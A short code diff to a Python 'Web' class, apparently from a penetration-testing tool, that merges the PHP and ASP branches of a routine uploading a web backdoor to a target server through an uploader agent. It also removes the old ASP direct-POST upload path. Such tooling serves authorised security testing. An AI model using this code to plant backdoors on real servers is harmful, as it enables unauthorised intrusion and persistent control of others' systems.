@@ -86,31 +86,16 @@ class Web:
         return retVal
 
     def __webFileStreamUpload(self, stream, destFileName, directory):
-        if self.webApi == "php":
+        if self.webApi in ("php", "asp"):
             multipartParams = {
                                 "upload":    "1",
                                 "file":      stream,
                                 "uploadDir": directory,
                               }
                               
-            page = Request.getPage(url=self.webUploaderUrl, multipart=multipartParams)
+            page = Request.getPage(url=self.webUploaderUrl, multipart=multipartParams, raise404=False)
 
             if "File uploaded" not in page:
-                warnMsg  = "unable to upload the backdoor through "
-                warnMsg += "the uploader agent on '%s'" % directory
-                logger.warn(warnMsg)
-                return False
-            else:
-                return True
-
-        elif self.webApi == "asp":
-            backdoorRemotePath = "%s/%s" % (directory, destFileName)
-            backdoorRemotePath = normalizePath(backdoorRemotePath)
-            backdoorContent = stream.read()
-            postStr = "f=%s&d=%s" % (backdoorRemotePath, backdoorContent)
-            page, _ = Request.getPage(url=self.webUploaderUrl, direct=True, post=postStr)
-
-            if "permission denied" in page.lower():
                 warnMsg  = "unable to upload the backdoor through "
                 warnMsg += "the uploader agent on '%s'" % directory
                 logger.warn(warnMsg)
